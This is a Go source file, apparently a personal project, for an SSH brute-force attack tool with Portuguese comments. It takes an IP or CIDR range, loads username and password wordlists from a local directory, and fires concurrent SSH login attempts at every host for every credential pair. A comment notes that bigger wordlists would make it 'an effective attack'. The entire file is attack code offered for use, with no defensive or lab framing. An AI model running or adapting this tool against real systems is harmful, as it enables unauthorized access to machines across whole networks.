package main

import (
  "fmt"
  "os"
  "sync"
  "bruteforce/sshmod"
  "bufio"
  "validation"
  "portscan/host"
)

// Atualmente mostra todas as tentativas de login
// Necessario aumentar o banco de dados de usuarios e senhas para ser um ataque efetivo

const limit = 10
const dir = "/home/aledemelo/Documentos/btdocs"
var channel = make(chan int, limit)

func main(){
  addrip := askInput()
  isvalid := verifyInputType(addrip)
  for isvalid == nil {
    isvalid = verifyInputType(askInput())
  }
  // pegar nome do diretorio de usuarios e passwords
  users, err := readInputFile(dir + "/users.txt")
  if err != nil {
    fmt.Println("[!] Cannot read users file")
    os.Exit(1)
  }

  passes, err := readInputFile(dir + "/passwords.txt")
  if err != nil {
    fmt.Println("[!] Cannot read password file")
    os.Exit(0)
  }

  var wg sync.WaitGroup
  for i:=0; i<len(isvalid); i++ {
    fmt.Printf("\n--------------- Brute Force Attack with IP: %v ---------------\n\n", isvalid[i])
	  for _, user := range users {
		   for _, pass := range passes {
			    channel <- 0
			    wg.Add(1)
			    go sshmod.SshConnect(&wg, channel, user, pass, isvalid[i])
		   }
    }
	}
wg.Wait()
}

func askInput() string {
  var addrip string
  fmt.Printf("Informe o IP a ser analisado: ")
  fmt.Scanf("%s", &addrip)
  return addrip
}

func verifyInputType(input string) []string {
  var ips []string
  if validation.IsIP(input){
    ips = append(ips, input)
    return ips
  } else if validation.IsCIDR(input){
    ips, _ = host.GetNetworkHosts(input)
    return ips
  } else {
    fmt.Println("[*] Entrada inválida. Ex: 172.16.1.2 ou 172.16.1.2/16 \n")
    return nil
  }
}

func readInputFile(f string) (data []string, err error) {
	arq, err := os.Open(f)
	if err != nil {
		return nil, err
	}
	defer arq.Close()

	scanner := bufio.NewScanner(arq)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
  return data, nil
}
